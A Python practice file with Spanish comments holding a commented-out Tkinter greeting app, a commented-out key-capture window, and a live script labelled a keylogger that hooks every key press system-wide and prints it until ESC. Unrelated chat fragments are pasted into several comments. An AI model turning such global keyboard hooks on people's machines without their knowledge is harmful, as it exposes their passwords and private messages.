# import tkinter as tk
# from tkinter import messagebox

# # Función que se ejecuta al hacer clic en el botón
# def mostrar_mensaje():
#     nombre = entrada.get()
#     if nombre:
#         messagebox.showinfo("Mensaje", f"¡Hola, {nombre}!")
#     else:
#         messagebox.showwarning("Advertencia", "Por favor, ingresa tu nombre.")

# # Crear la ventana principal
# ventana = tk.Tk()
# ventana.title("Interfaz con Tkinter") hola como estas que haces que me constas mira seque estas un poco ma
# ventana.geometry("300x200")

# # Crear un label (etiqueta)
# etiqueta = tk.Label(ventana, text="Ingresa tu nombre:")
# etiqueta.pack(pady=5)

# # Crear un campo de entrada
# entrada = tk.Entry(ventana)
# entrada.pack(pady=5)

# # Crear un botón
# boton = tk.Button(ventana, text="Saludar", command=mostrar_mensaje)
# boton.pack(pady=10)

# # Ejecutar la aplicación
# ventana.mainloop()




# import tkinter as tk
# from pynput import keyboard

# # Función para actualizar la interfaz con las teclas presionadas
# def on_press(tecla):
#     try:
#         # Si es una tecla imprimible (letra o número), agregarla
#         if hasattr(tecla, 'char') and tecla.char is not None:
#             texto.insert(tk.END, tecla.char)
#         # Si es la tecla espacio, agregar un espacio
#         elif tecla == keyboard.Key.space:
#             texto.insert(tk.END, " ")  
        
#         texto.see(tk.END)  # Auto-scroll hacia abajo hola Alexander Que haces
#     except AttributeError:
#         pass  


# ventana = tk.Tk()
# ventana.title("Capturar Teclas")
# ventana.geometry("400x300")

# # Widget para mostrar las teclas presionadas
# texto = tk.Text(ventana, wrap="word", height=15, width=50)
# texto.pack(pady=10)

# # Iniciar el listener de teclado en segundo plano
# listener = keyboard.Listener(on_press=on_press)
# listener.start()

# # Ejecutar la interfaz
# ventana.mainloop()








import keyboard  # pip install keyboard

print("Keylogger iniciado (Presiona 'ESC' para salir)...\n")

def on_key_press(event):
    if event.name == 'esc':
        print("\n[!] Keylogger detenido.")
        return False  # Detiene el keylogger
    
    # Reemplaza teclas especiales por símbolos más legibles
    key = event.name
    replacements = {
        'space': 'ESPACIO',
        'enter': 'ENTER',
        'esc': 'ESC',
        'shift': 'SHIFT',
        'ctrl': 'CTRL',
        'alt': 'ALT',
        'tab': 'TAB',
        'backspace': 'BORRAR'
    }
    
    # Muestra cada tecla en una nueva línea
    print(f"> {replacements.get(key, key)}")

# Configura el hook y espera la tecla ESC hola que mas que hace bebe ayer me dijo que no iva
#a perder mas el tiempo que fue lo que hizo 
keyboard.on_press(on_key_press)
keyboard.wait('esc')